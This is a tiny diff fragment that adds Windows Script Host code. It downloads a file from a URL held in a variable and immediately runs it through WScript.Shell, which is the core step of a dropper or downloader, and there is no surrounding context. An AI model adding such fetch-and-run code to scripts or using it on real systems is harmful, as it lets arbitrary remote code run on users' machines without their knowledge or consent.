@@ -1,0 +1,7 @@
+
+	downloadToFile(url2down ,FullPath )
+	
+
+
+   WScript.CreateObject("WScript.Shell").Run ( FullPath,1); 
+
